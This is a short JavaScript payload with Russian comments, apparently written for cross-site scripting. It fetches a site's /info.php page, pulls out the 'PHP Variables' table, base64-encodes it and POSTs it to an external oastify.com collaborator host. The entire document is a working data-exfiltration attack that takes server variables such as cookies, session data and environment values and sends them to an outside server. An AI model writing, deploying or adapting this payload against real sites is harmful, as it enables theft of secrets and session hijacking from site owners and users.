// Запрос к /info.php
fetch('/info.php')
  .then(response => response.text())
  .then(html => {
    // Парсинг HTML
    const parser = new DOMParser();
    const doc = parser.parseFromString(html, 'text/html');
    
    // Поиск раздела "PHP Variables"
    const phpVarsHeader = Array.from(doc.querySelectorAll('h2, h1'))
      .find(el => el.textContent.includes('PHP Variables'));
    
    if (!phpVarsHeader) {
      throw new Error('PHP Variables section not found');
    }
    
    // Поиск следующей таблицы после заголовка
    let nextElement = phpVarsHeader.nextElementSibling;
    while (nextElement && nextElement.tagName !== 'TABLE') {
      nextElement = nextElement.nextElementSibling;
    }
    
    if (!nextElement) {
      throw new Error('Table not found after PHP Variables header');
    }
    
    // Кодирование в Base64
    const tableContent = nextElement.outerHTML;
    const base64Content = btoa(unescape(encodeURIComponent(tableContent)));
    
    // Отправка данных на указанный сервер
    const targetURL = 'https://nqhafadojubl2h6s5q2icici99f93zro.oastify.com';
    return fetch(targetURL, {
      method: 'POST',
      mode: 'no-cors',
      headers: {
        'Content-Type': 'text/plain'
      },
      body: base64Content
    });
  })
  .catch(error => {
    console.error('Error:', error);
  });
